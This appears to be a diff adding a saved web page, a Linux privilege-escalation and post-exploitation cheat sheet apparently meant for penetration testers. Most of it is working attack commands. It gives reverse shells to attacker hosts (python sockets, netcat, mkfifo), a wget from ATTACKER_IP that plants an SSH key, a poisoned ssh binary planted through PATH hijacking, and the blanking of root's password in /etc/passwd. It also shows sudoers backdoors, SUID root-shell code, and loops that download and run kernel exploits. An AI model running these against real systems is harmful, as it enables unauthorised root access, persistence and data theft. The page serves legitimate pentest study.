@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<!-- saved from url=(0024)https://guif.re/linuxeop -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <title>Linux elevation of privileges</title>
+        
+        <link rel="stylesheet" type="text/css" href="./Linux elevation of privileges_files/main.css">
+        <link rel="icon" type="image/png" sizes="32x32" href="https://guif.re/assets/favicon.png">
+        <script async="" src="./Linux elevation of privileges_files/analytics.js.download"></script><script src="./Linux elevation of privileges_files/syntaxhighlighter.js.download"></script>
+    </head>
+    <body>
+        <fieldset class="box">
+            <legend>Linux elevation of privileges ToC</legend>
+                <ul>
+                    <li><span><a href="https://guif.re/linuxeop#Post%20exploitation">Post exploitation</a></span></li>
+                    <li><span><a href="https://guif.re/linuxeop#Escaping%20limited%20interpreters">Escaping limited interpreters</a></span></li>
+                    <li><span><a href="https://guif.re/linuxeop#Linux%20elevation%20of%20privileges,%20manual%20testing">Linux elevation of privileges, manual testing</a></span></li>
+                    <li><span><a href="https://guif.re/linuxeop#Scripts%20to%20run">Scripts to run</a></span></li>
+                    <li><span><a href="https://guif.re/linuxeop#Exploits%20worth%20running">Exploits worth running</a></span></li>
+                    <li><span><a href="https://guif.re/linuxeop#Open%20an%20xterm%20remotely">Open an xterm remotely</a></span></li>
+                    <li><span><a href="https://guif.re/linuxeop#Get%20proof">Get proof</a></span></li>
+                    <li><span><a href="https://guif.re/linuxeop#Elevation%20in%202.6.x:">Elevation in 2.6.x:</a></span></li>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <a name="Post exploitation"></a>
+            <legend>Post exploitation</legend>
+                <p>Get a TTY shell after a reverse shell connection</p>
+                <pre><code>$&nbsp;python&nbsp;-c&nbsp;<span class="green">'import pty;pty.spawn("</span>/bin/bash<span class="green">")'</span></code></pre>
+                <p>Set PATH TERM and SHELL if missing:</p>
+                <pre><code>$&nbsp;<span class="red">export</span>&nbsp;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+export&nbsp;TERM=xterm
+export&nbsp;SHELL=bash</code></pre>
+                <p>Add public key to authorized keys:</p>
+                <pre><code>$&nbsp;<span class="red">echo</span>&nbsp;<span class="green">$</span>(<span class="red">wget</span>&nbsp;<span class="blue">https://ATTACKER_IP/.ssh/id_rsa.pub)</span>&nbsp;&gt;&gt;&nbsp;~/.ssh/authorized_keys</code></pre>
+        </fieldset>
+        <fieldset class="box">
+            <a name="Escaping limited interpreters"></a>
+            <legend>Escaping limited interpreters</legend>
+                <p>Some payloads to overcome limited shells:</p>
+                <pre><code>$&nbsp;<span class="red">ssh</span>&nbsp;user@$ip&nbsp;nc&nbsp;$localip&nbsp;4444&nbsp;-e&nbsp;/bin/sh
+&nbsp;&nbsp;&nbsp;&nbsp;enter&nbsp;user<span class="green">'s password
+$ python -c '</span><span class="blue">import</span>&nbsp;pty;&nbsp;<span class="green">pty.spawn</span>(<span class="green">"/bin/sh"</span>)'
+$ export TERM=linux</code></pre>
+                <pre><code>$&nbsp;python&nbsp;-c&nbsp;<span class="green">'import pty; pty.spawn("</span>/bin/sh<span class="green">")'</span></code></pre>
+                <pre><code>$&nbsp;python&nbsp;-c&nbsp;<span class="green">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("</span>$ip<span class="green">",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),   *$ 1); os.dup2(s.fileno(),2);p=subprocess.call(["</span>/bin/sh<span class="green">","</span>-i<span class="green">"]);'</span></code></pre>
+                <pre><code>$&nbsp;<span class="red">echo</span>&nbsp;<span class="green">os.system</span>(<span class="green">'/bin/bash'</span>)</code></pre>
+                <pre><code>$&nbsp;/bin/sh&nbsp;-i</code></pre>
+                <pre><code>$&nbsp;<span class="red">exec</span>&nbsp;<span class="green">"/bin/sh"</span>;</code></pre>
+                <pre><code>$&nbsp;perl&nbsp;—e&nbsp;<span class="green">'exec "</span>/bin/sh<span class="green">";'</span></code></pre>
+                <p>From within tcpdump</p>
+                <pre><code>$&nbsp;<span class="red">echo</span>&nbsp;$’id\n/bin/netcat&nbsp;$ip&nbsp;443&nbsp;-e&nbsp;/bin/bash’&nbsp;&gt;&nbsp;/tmp/.test
+chmod&nbsp;+x&nbsp;/tmp/.test
+sudo&nbsp;tcpdump&nbsp;-ln&nbsp;-I&nbsp;eth-&nbsp;-w&nbsp;/dev/null&nbsp;-W&nbsp;1&nbsp;-G&nbsp;1&nbsp;-z&nbsp;/tmp/.tst&nbsp;-Z&nbsp;root</code></pre>
+                <p>From busybox</p>
+                <pre><code>$&nbsp;/bin/busybox&nbsp;telnetd&nbsp;-|/bin/sh&nbsp;-p9999</code></pre>
+                <pre><code>:!bash
+:set&nbsp;shell=/bin/bash:shell
+!bash
+find&nbsp;/&nbsp;-exec&nbsp;/usr/bin/awk&nbsp;<span class="green">'BEGIN {system("</span>/bin/bash<span class="green">")}'</span>&nbsp;;
+awk&nbsp;<span class="green">'BEGIN {system("</span>/bin/bash<span class="green">")}'</span>
+--interactive
+echo&nbsp;<span class="green">"os.execute('</span>/bin/sh<span class="green">')"</span>
+sudo&nbsp;nmap&nbsp;--script=exploit.nse
+perl&nbsp;-e&nbsp;<span class="green">'exec "</span>/bin/bash<span class="green">";'</span></code></pre>
+        </fieldset>
+        <fieldset class="box">
+            <a name="Linux elevation of privileges, manual testing"></a>
+            <legend>Linux elevation of privileges, manual testing</legend>
+                <p>Things to look: Miss-configured services (cronjobs), incorrect file permissions (exportfs, sudo), miss-configured environment ($PATH), binary with SUID bit, software or OS with known vulnerabilities.</p>
+                <p>First try simple sudo:</p>
+                <pre><code>$&nbsp;<span class="red">sudo</span>&nbsp;<span class="red">su</span>&nbsp;-</code></pre>
+                <p>What can we run with sudo?</p>
+                <pre><code>$&nbsp;<span class="red">sudo</span>&nbsp;-l</code></pre>
+                <p>Try su as all users and the username as password</p>
+                <p>What services are running as root?:</p>
+                <pre><code>$&nbsp;<span class="red">ps</span>&nbsp;aux&nbsp;|&nbsp;<span class="red">grep</span>&nbsp;root</code></pre>
+                <p>Look for vulnerable/privileged components such as: mysql, sudo, udev, python</p>
+                <p>If <strong>/etc/exports</strong> if writable, you can add an NFS entry or change and existing entry adding the <strong>no_root_squash</strong> flag to a root directory, put a binary with SUID bit on, and get root.</p>
+                <p>If there is a <strong>cronjob</strong> that runs as run but it has incorrect file permissions, you can change it to run your SUID binary and get a shell.</p>
+                <p>The following command will list processes running by root, permissions and NFS exports.</p>
+                <pre><code>$&nbsp;<span class="red">echo</span>&nbsp;<span class="green">'services running as root'</span>;&nbsp;<span class="red">ps</span>&nbsp;aux&nbsp;|&nbsp;<span class="red">grep</span>&nbsp;root;&nbsp;&nbsp;<span class="red">echo</span>&nbsp;<span class="green">'permissions'</span>;&nbsp;<span class="red">ps</span>&nbsp;aux&nbsp;|&nbsp;<span class="red">awk</span>&nbsp;<span class="green">'{print $11}'</span>|xargs&nbsp;-r&nbsp;<span class="red">ls</span>&nbsp;-la&nbsp;2&gt;/dev/null&nbsp;|awk&nbsp;<span class="green">'!x[$0]++'</span>;&nbsp;<span class="red">echo</span>&nbsp;<span class="green">'nfs info'</span>;&nbsp;<span class="red">ls</span>&nbsp;-la&nbsp;/etc/exports&nbsp;2&gt;/dev/null;&nbsp;<span class="red">cat</span>&nbsp;/etc/exports&nbsp;2&gt;/dev/null</code></pre>
+                <p>Use netstat to find other machines connected</p>
+                <pre><code>$&nbsp;<span class="red">netstat</span>&nbsp;-ano</code></pre>
+                <p>Command to skip ignored lines in config files</p>
+                <pre><code>$&nbsp;<span class="red">alias</span>&nbsp;nonempty=<span class="green">"egrep -v '</span>^[&nbsp;\t]*#|^$<span class="green">'"</span></code></pre>
+                <p>If Mysql is running as root, you can run commands using <strong>sys_exec()</strong>. For instance, to add user to sudoers:</p>
+                <pre><code><span class="green">sys_exec</span>(<span class="green">'usermod -a -G admin username'</span>)</code></pre>
+                <p>More about mysql:</p>
+                <pre><code><span class="blue">https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/</span></code></pre>
+                <p>Find linux distribution &amp; version</p>
+                <pre><code>$&nbsp;<span class="red">cat</span>&nbsp;/etc/issue;&nbsp;<span class="red">cat</span>&nbsp;/etc/*-release;&nbsp;<span class="red">cat</span>&nbsp;/etc/lsb-release;&nbsp;<span class="red">cat</span>&nbsp;/etc/redhat-release;</code></pre>
+                <p>Architecture</p>
+                <pre><code>$&nbsp;<span class="red">cat</span>&nbsp;/proc/version;&nbsp;<span class="red">uname</span>&nbsp;-a;&nbsp;<span class="red">uname</span>&nbsp;-mrs;&nbsp;<span class="red">rpm</span>&nbsp;-q&nbsp;kernel;&nbsp;dmesg&nbsp;|&nbsp;<span class="red">grep</span>&nbsp;Linux;&nbsp;<span class="red">ls</span>&nbsp;/boot&nbsp;|&nbsp;<span class="red">grep</span>&nbsp;vmlinuz-;&nbsp;file&nbsp;/bin/ls;&nbsp;<span class="red">cat</span>&nbsp;/etc/lsb-release</code></pre>
+                <p>Environment variables</p>
+                <pre><code>$&nbsp;<span class="red">cat</span>&nbsp;/etc/profile;&nbsp;<span class="red">cat</span>&nbsp;/etc/bashrc;&nbsp;<span class="red">cat</span>&nbsp;~/.bash_profile;&nbsp;<span class="red">cat</span>&nbsp;~/.bashrc;&nbsp;<span class="red">cat</span>&nbsp;~/.bash_logout;&nbsp;env;&nbsp;set</code></pre>
+                <p>Find printers</p>
+                <pre><code>$&nbsp;lpstat&nbsp;-a</code></pre>
+                <p>Find apps installed;</p>
+                <pre><code>$&nbsp;<span class="red">ls</span>&nbsp;-alh&nbsp;/usr/bin/;&nbsp;<span class="red">ls</span>&nbsp;-alh&nbsp;/sbin/;&nbsp;dpkg&nbsp;-l;&nbsp;<span class="red">rpm</span>&nbsp;-qa;&nbsp;<span class="red">ls</span>&nbsp;-alh&nbsp;/var/cache/apt/archivesO;&nbsp;<span class="red">ls</span>&nbsp;-alh&nbsp;/var/cache/yum/*;</code></pre>
+                <p>Find writable configuration files</p>
+                <pre><code>$&nbsp;<span class="red">find</span>&nbsp;/etc/&nbsp;-writable&nbsp;-type&nbsp;f&nbsp;2&gt;/dev/null</code></pre>
+                <p>Miss-configured services</p>
+                <pre><code>$&nbsp;<span class="red">cat</span>&nbsp;/etc/syslog.conf;&nbsp;<span class="red">cat</span>&nbsp;/etc/chttp.conf;&nbsp;<span class="red">cat</span>&nbsp;/etc/lighttpd.conf;&nbsp;<span class="red">cat</span>&nbsp;/etc/cups/cupsd.conf;&nbsp;<span class="red">cat</span>&nbsp;/etc/inetd.conf;&nbsp;<span class="red">cat</span>&nbsp;/etc/apache2/apache2.conf;&nbsp;<span class="red">cat</span>&nbsp;/etc/my.conf;&nbsp;<span class="red">cat</span>&nbsp;/etc/httpd/conf/httpd.conf;&nbsp;<span class="red">cat</span>&nbsp;/opt/lampp/etc/httpd.conf;&nbsp;<span class="red">ls</span>&nbsp;-aRl&nbsp;/etc/&nbsp;|&nbsp;<span class="red">awk</span>&nbsp;'$1 ~ /^.*r.*/</code></pre>
+                <p>Scheduled jobs</p>
+                <pre><code>$&nbsp;crontab&nbsp;-l;&nbsp;<span class="red">ls</span>&nbsp;-alh&nbsp;/var/spool/cron;&nbsp;<span class="red">ls</span>&nbsp;-al&nbsp;/etc/&nbsp;|&nbsp;<span class="red">grep</span>&nbsp;cron;&nbsp;<span class="red">ls</span>&nbsp;-al&nbsp;/etc/cron*;&nbsp;<span class="red">cat</span>&nbsp;/etc/cron*;&nbsp;<span class="red">cat</span>&nbsp;/etc/at.allow;&nbsp;<span class="red">cat</span>&nbsp;/etc/at.deny;&nbsp;<span class="red">cat</span>&nbsp;/etc/cron.allow;&nbsp;<span class="red">cat</span>&nbsp;/etc/cron.deny</code></pre>
+                <p>Grep hardcoded passwords</p>
+                <pre><code>$&nbsp;<span class="red">grep</span>&nbsp;-i&nbsp;user&nbsp;[filename]
+grep&nbsp;-i&nbsp;<span class="blue">pass</span>&nbsp;[filename]
+grep&nbsp;-C&nbsp;5&nbsp;<span class="green">"password"</span>&nbsp;[filename]
+find&nbsp;.&nbsp;-name&nbsp;<span class="green">"*.php"</span>&nbsp;-print0&nbsp;|&nbsp;xargs&nbsp;-0&nbsp;<span class="red">grep</span>&nbsp;-i&nbsp;-n&nbsp;<span class="green">"var $password"</span></code></pre>
+                <p>if web server run in web root:</p>
+                <pre><code>$&nbsp;<span class="red">grep</span>&nbsp;<span class="green">"localhost"</span>&nbsp;./&nbsp;-R</code></pre>
+                <p>Network configuration</p>
+                <pre><code>$&nbsp;/sbin/ifconfig&nbsp;-a;&nbsp;<span class="red">cat</span>&nbsp;/etc/network/interfaces;&nbsp;<span class="red">cat</span>&nbsp;/etc/sysconfig/network;&nbsp;<span class="red">cat</span>&nbsp;/etc/resolv.conf;&nbsp;<span class="red">cat</span>&nbsp;/etc/sysconfig/network;&nbsp;<span class="red">cat</span>&nbsp;/etc/networks;&nbsp;iptables&nbsp;-L;&nbsp;hostname;&nbsp;dnsdomainname</code></pre>
+                <p>List other users home directories</p>
+                <pre><code>$&nbsp;<span class="red">ls</span>&nbsp;-ahlR&nbsp;/root/;&nbsp;<span class="red">ls</span>&nbsp;-ahlR&nbsp;/home/</code></pre>
+                <p>User bash history</p>
+                <pre><code>$&nbsp;<span class="red">cat</span>&nbsp;~/.bash_history;&nbsp;<span class="red">cat</span>&nbsp;~/.nano_history;&nbsp;<span class="red">cat</span>&nbsp;~/.atftp_history;&nbsp;<span class="red">cat</span>&nbsp;~/.mysql_history;&nbsp;<span class="red">cat</span>&nbsp;~/.php_history</code></pre>
+                <p>User mails</p>
+                <pre><code>$&nbsp;<span class="red">cat</span>&nbsp;~/.bashrc;&nbsp;<span class="red">cat</span>&nbsp;~/.profile;&nbsp;<span class="red">cat</span>&nbsp;/var/mail/root;&nbsp;<span class="red">cat</span>&nbsp;/var/spool/mail/root</code></pre>
+                <p>Find interesting binaries</p>
+                <pre><code>$&nbsp;<span class="red">find</span>&nbsp;/&nbsp;-name&nbsp;wget;&nbsp;<span class="red">find</span>&nbsp;/&nbsp;-name&nbsp;nc*;&nbsp;<span class="red">find</span>&nbsp;/&nbsp;-name&nbsp;netcat*;&nbsp;<span class="red">find</span>&nbsp;/&nbsp;-name&nbsp;tftp*;&nbsp;<span class="red">find</span>&nbsp;/&nbsp;-name&nbsp;<span class="red">ftp</span></code></pre>
+                <p>Mounted filesystems</p>
+                <pre><code>$&nbsp;mount;&nbsp;<span class="red">df</span>&nbsp;-h;&nbsp;<span class="red">cat</span>&nbsp;/etc/fstab</code></pre>
+                <p>Look for binaries with the SUID or GUID bits set.</p>
+                <pre><code>$&nbsp;<span class="red">find</span>&nbsp;/&nbsp;-perm&nbsp;-g=s&nbsp;-o&nbsp;-perm&nbsp;-4000&nbsp;!&nbsp;-type&nbsp;l&nbsp;-maxdepth&nbsp;6&nbsp;-exec&nbsp;<span class="red">ls</span>&nbsp;-ld&nbsp;{}&nbsp;\;&nbsp;2&gt;/dev/null
+$&nbsp;<span class="red">find</span>&nbsp;/&nbsp;-perm&nbsp;-1000&nbsp;-type&nbsp;d&nbsp;2&gt;/dev/null
+$&nbsp;<span class="red">find</span>&nbsp;/&nbsp;-perm&nbsp;-g=s&nbsp;-type&nbsp;f&nbsp;2&gt;/dev/null</code></pre>
+                <p>Adding a binary to PATH, to hijack another SUID binary invokes it without the fully qualified path.</p>
+                <pre><code>$&nbsp;<span class="blue">function</span>&nbsp;/usr/bin/foo&nbsp;()&nbsp;{&nbsp;/usr/bin/echo&nbsp;<span class="green">"It works"</span>;&nbsp;}
+$&nbsp;<span class="red">export</span>&nbsp;-f&nbsp;/usr/bin/foo
+$&nbsp;/usr/bin/foo
+&nbsp;&nbsp;&nbsp;&nbsp;It&nbsp;works</code></pre>
+                <p>if you can just change PATH, the following will add a poisoned ssh binary:</p>
+                <pre><code>&nbsp;set&nbsp;PATH=<span class="green">"/tmp:/usr/local/bin:/usr/bin:/bin"</span>
+&nbsp;<span class="red">echo</span>&nbsp;<span class="green">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.1 4444 &gt;/tmp/f"</span>&nbsp;&gt;&gt;&nbsp;/tmp/ssh
+&nbsp;<span class="red">chmod</span>&nbsp;+x&nbsp;<span class="red">ssh</span></code></pre>
+                <p>Generating SUID C Shell for /bin/bash</p>
+                <pre><code><span class="blue">int</span>&nbsp;<span class="green">main</span>(void){
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="green">setresuid</span>(0,&nbsp;0,&nbsp;0);
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="green">system</span>(<span class="green">"/bin/bash"</span>);
+}</code></pre>
+                <p>Without interactive shell</p>
+                <pre><code>$&nbsp;<span class="red">echo</span>&nbsp;-e&nbsp;<span class="green">'#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;unistd.h&gt;\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem("</span>/bin/bash<span class="green">");\n}'</span>&nbsp;&gt;&nbsp;setuid.c</code></pre>
+                <p>If you can get root to execute anything, the following will change a binary owner to him and set the SUID flag:</p>
+                <pre><code>$&nbsp;<span class="red">chown</span>&nbsp;root:root&nbsp;/tmp/setuid;chmod&nbsp;4777&nbsp;/tmp/setuid;</code></pre>
+                <p>If /etc/passwd has incorrect permissions, you can root:</p>
+                <pre><code>&nbsp;$&nbsp;<span class="red">echo</span>&nbsp;<span class="green">'root::0:0:root:/root:/bin/bash'</span>&nbsp;&gt;&nbsp;/etc/passwd;&nbsp;<span class="red">su</span></code></pre>
+                <p>Add user www-data to sudoers with no password</p>
+                <pre><code>$&nbsp;<span class="red">echo</span>&nbsp;<span class="green">'chmod 777 /etc/sudoers &amp;&amp; echo "</span>www-data&nbsp;ALL=NOPASSWD:ALL<span class="green">" &gt;&gt; /etc/sudoers &amp;&amp; chmod 440 /etc/sudoers'</span>&nbsp;&gt;&nbsp;/tmp/update</code></pre>
+                <p>If you can sudo chmod:</p>
+                <pre><code>&nbsp;$echo&nbsp;-e&nbsp;<span class="green">'#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;unistd.h&gt;\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem("</span>/bin/bash<span class="green">");\n}'</span>&nbsp;&gt;&nbsp;setuid.c&nbsp;$&nbsp;<span class="red">sudo</span>&nbsp;<span class="red">chown</span>&nbsp;root:root&nbsp;/tmp/setuid;&nbsp;<span class="red">sudo</span>&nbsp;<span class="red">chmod</span>&nbsp;4777&nbsp;/tmp/setuid;&nbsp;/tmp/setuid</code></pre>
+                <p>Wildcard injection if there is a cron with a wildcard in the command line, you can create a file, whose name will be passed as an argument to the cron task, For more info:</p>
+                <pre><code><span class="blue">https://www.sans.org/reading-room/whitepapers/testing/attack-defend-linux-privilege-escalation-techniques-2016-37562</span></code></pre>
+                <p>compile exploit fix error</p>
+                <pre><code>$&nbsp;gcc&nbsp;9545.c&nbsp;-o&nbsp;9545&nbsp;-Wl,--hash-style=both</code></pre>
+                <p>Find other uses in the system</p>
+                <pre><code>&nbsp;$id;&nbsp;who;&nbsp;w;&nbsp;last;&nbsp;<span class="red">cat</span>&nbsp;/etc/passwd&nbsp;|&nbsp;cut&nbsp;-d:&nbsp;-f1;&nbsp;<span class="red">echo</span>&nbsp;<span class="green">'sudoers:'</span>;&nbsp;<span class="red">cat</span>&nbsp;/etc/sudoers;&nbsp;<span class="red">sudo</span>&nbsp;-l</code></pre>
+                <p>World readable/writable files:</p>
+                <pre><code>$&nbsp;<span class="red">echo</span>&nbsp;<span class="green">"world-writeable folders"</span>;&nbsp;<span class="red">find</span>&nbsp;/&nbsp;-writable&nbsp;-type&nbsp;d&nbsp;2&gt;/dev/null;&nbsp;<span class="red">echo</span>&nbsp;<span class="green">"world-writeable folders"</span>;&nbsp;<span class="red">find</span>&nbsp;/&nbsp;-perm&nbsp;-222&nbsp;-type&nbsp;d&nbsp;2&gt;/dev/null;&nbsp;<span class="red">echo</span>&nbsp;<span class="green">"world-writeable folders"</span>;&nbsp;<span class="red">find</span>&nbsp;/&nbsp;-perm&nbsp;-o&nbsp;w&nbsp;-type&nbsp;d&nbsp;2&gt;/dev/null;&nbsp;<span class="red">echo</span>&nbsp;<span class="green">"world-executable folders"</span>;&nbsp;<span class="red">find</span>&nbsp;/&nbsp;-perm&nbsp;-o&nbsp;x&nbsp;-type&nbsp;d&nbsp;2&gt;/dev/null;&nbsp;<span class="red">echo</span>&nbsp;<span class="green">"world-writeable &amp; executable folders"</span>;&nbsp;<span class="red">find</span>&nbsp;/&nbsp;<span class="green">\</span>(&nbsp;-perm&nbsp;-o&nbsp;w&nbsp;-perm&nbsp;-o&nbsp;x&nbsp;\)&nbsp;-type&nbsp;d&nbsp;2&gt;/dev/null;</code></pre>
+                <p>Find world-readable files:</p>
+                <pre><code>$&nbsp;<span class="red">find</span>&nbsp;/&nbsp;-xdev&nbsp;-type&nbsp;d&nbsp;<span class="green">\</span>(&nbsp;-perm&nbsp;-0002&nbsp;-a&nbsp;!&nbsp;-perm&nbsp;-1000&nbsp;\)&nbsp;-print</code></pre>
+                <p>Find nobody owned files</p>
+                <pre><code>$&nbsp;<span class="red">find</span>&nbsp;/dir&nbsp;-xdev&nbsp;<span class="green">\</span>(&nbsp;-nouser&nbsp;-o&nbsp;-nogroup&nbsp;\)&nbsp;-print</code></pre>
+                <p>Add user to sudoers in python.</p>
+                <pre><code>#!/usr/bin/env&nbsp;python
+import&nbsp;os
+import&nbsp;sys
+try:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="green">os.system</span>(<span class="green">'echo "</span>username&nbsp;<span class="green">ALL=</span>(ALL:ALL)&nbsp;ALL<span class="green">" &gt;&gt; /etc/sudoers'</span>)
+except:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="green">sys.exit</span>()</code></pre>
+                <p>Ring0 kernel exploit for 2.3/2.4</p>
+                <pre><code><span class="red">wget</span>&nbsp;<span class="blue">http://downloads.securityfocus.com/vulnerabilities/exploits/36038-6.c;</span>&nbsp;gcc&nbsp;36038-6.c&nbsp;-m32&nbsp;-o&nbsp;ring0;&nbsp;<span class="red">chmod</span>&nbsp;+x&nbsp;ring0;&nbsp;./ring0</code></pre>
+                <p>Inspect web traffic</p>
+                <pre><code>$&nbsp;tcpdump&nbsp;tcp&nbsp;port&nbsp;80&nbsp;-w&nbsp;output.pcap&nbsp;-i&nbsp;eth0</code></pre>
+        </fieldset>
+        <fieldset class="box">
+            <a name="Scripts to run"></a>
+            <legend>Scripts to run</legend>
+                <p>The following script runs exploit suggester and automatically downloads and executes suggested exploits:</p>
+                <pre><code><span class="blue">https://raw.githubusercontent.com/codingo/OSCP-1/master/xploitdeli.py</span></code></pre>
+                <pre><code><span class="red">wget</span>&nbsp;<span class="blue">http://www.securitysift.com/download/linuxprivchecker.py</span></code></pre>
+                <pre><code><span class="red">wget</span>&nbsp;<span class="blue">https://github.com/pentestmonkey/unix-privesc-check</span></code></pre>
+                <p>Other scripts:</p>
+                <pre><code><span class="red">wget</span>&nbsp;<span class="blue">https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py</span></code></pre>
+                <pre><code><span class="red">wget</span>&nbsp;<span class="blue">https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</span></code></pre>
+                <pre><code><span class="red">wget</span>&nbsp;<span class="blue">https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh</span></code></pre>
+                <pre><code><span class="red">wget</span>&nbsp;<span class="blue">https://raw.githubusercontent.com/PenturaLabs/Linux_Exploit_Suggester/master/Linux_Exploit_Suggester.pl</span></code></pre>
+                <pre><code><span class="red">wget</span>&nbsp;&nbsp;<span class="blue">https://www.rebootuser.com/?p=1758</span></code></pre>
+        </fieldset>
+        <fieldset class="box">
+            <a name="Exploits worth running"></a>
+            <legend>Exploits worth running</legend>
+                <p>CVE-2010-3904 - Linux RDS Exploit - Linux Kernel &lt;= 2.6.36-rc8</p>
+                <pre><code><span class="blue">https://www.exploit-db.com/exploits/15285/</span></code></pre>
+                <p>Linux Kernel &lt;= 2.6.37 'Full-Nelson.c'</p>
+                <p>https://www.exploit-db.com/exploits/15704/</p>
+                <p>CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 &lt; 3.2.2 (Gentoo / Ubuntu x86/x64)</p>
+                <pre><code><span class="blue">https://git.zx2c4.com/CVE-2012-0056/about/</span></code></pre>
+                <p>Linux CVE 2012-0056</p>
+                <pre><code><span class="red">wget</span>&nbsp;-O&nbsp;exploit.c&nbsp;<span class="blue">&lt;http://www.exploit-db.com/download/18411&gt;
+</span>&nbsp;&nbsp;gcc&nbsp;-o&nbsp;mempodipper&nbsp;exploit.c
+&nbsp;&nbsp;./mempodipper</code></pre>
+                <p>CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux Kernel &lt;= 3.19.0-73.8</p>
+                <pre><code><span class="blue">https://dirtycow.ninja/</span></code></pre>
+                <p>Compile dirty cow:</p>
+                <pre><code>&nbsp;g++&nbsp;-Wall&nbsp;-pedantic&nbsp;-O2&nbsp;-std=c++11&nbsp;-pthread&nbsp;-o&nbsp;dcow&nbsp;40847.cpp&nbsp;-lutil</code></pre>
+                <p>Cross compiling exploits</p>
+                <pre><code>$&nbsp;gcc&nbsp;-m32&nbsp;-o&nbsp;output32&nbsp;hello.c&nbsp;<span class="green">#</span>(32&nbsp;bit)
+$ &nbsp;gcc&nbsp;-m64&nbsp;-o&nbsp;output&nbsp;hello.c&nbsp;#&nbsp;(64&nbsp;bit)</code></pre>
+                <p>Linux 2.6.32</p>
+                <pre><code><span class="blue">https://www.exploit-db.com/exploits/15285/</span></code></pre>
+        </fieldset>
+        <fieldset class="box">
+            <a name="Open an xterm remotely"></a>
+            <legend>Open an xterm remotely</legend>
+                <p>First, run an xserver in your machine</p>
+                <pre><code>$&nbsp;Xnest&nbsp;:1</code></pre>
+                <p>Then, bind it to xterm, again in your machine:</p>
+                <pre><code>$&nbsp;xterm&nbsp;-display&nbsp;<span class="blue">127.0.0.1:1</span></code></pre>
+                <p>Finally, run the follwing in the remote machine:</p>
+                <pre><code>$&nbsp;/usr/openwin/bin/xterm&nbsp;-display&nbsp;yourip:1</code></pre>
+        </fieldset>
+        <fieldset class="box">
+            <a name="Get proof"></a>
+            <legend>Get proof</legend>
+                <pre><code>$&nbsp;<span class="red">echo</span>&nbsp;<span class="green">" "</span>;echo&nbsp;<span class="green">"uname -a:"</span>;uname&nbsp;-a;echo&nbsp;<span class="green">" "</span>;echo&nbsp;<span class="green">"hostname:"</span>;hostname;echo&nbsp;<span class="green">" "</span>;echo&nbsp;<span class="green">"id"</span>;id;echo&nbsp;<span class="green">" "</span>;echo&nbsp;<span class="green">"ifconfig:"</span>;/sbin/ifconfig&nbsp;-a;echo&nbsp;<span class="green">" "</span>;echo&nbsp;<span class="green">"proof:"</span>;cat&nbsp;/root/proof.txt&nbsp;2&gt;/dev/null;&nbsp;<span class="red">cat</span>&nbsp;/Desktop/proof.txt&nbsp;2&gt;/dev/null;echo&nbsp;<span class="green">" "</span></code></pre>
+        </fieldset>
+        <fieldset class="box">
+            <a name="Elevation in 2.6.x:"></a>
+            <legend>Elevation in 2.6.x:</legend>
+                <pre><code>$&nbsp;<span class="red">for</span>&nbsp;a&nbsp;<span class="blue">in</span>&nbsp;9352&nbsp;9513&nbsp;33321&nbsp;15774&nbsp;15150&nbsp;15944&nbsp;9543&nbsp;33322&nbsp;9545&nbsp;25288&nbsp;40838&nbsp;40616&nbsp;40611&nbsp;;&nbsp;<span class="blue">do</span>&nbsp;<span class="red">wget</span>&nbsp;<span class="blue">http://yourIP:8000/$a;</span>&nbsp;<span class="red">chmod</span>&nbsp;+x&nbsp;$a;&nbsp;./$a;&nbsp;id;&nbsp;done</code></pre>
+        </fieldset>
+    <script>new Highlighter().run(document);</script>
+    <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m = s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-106217827-1', 'auto'); ga('send', 'pageview'); </script>
+    
+</body></html>
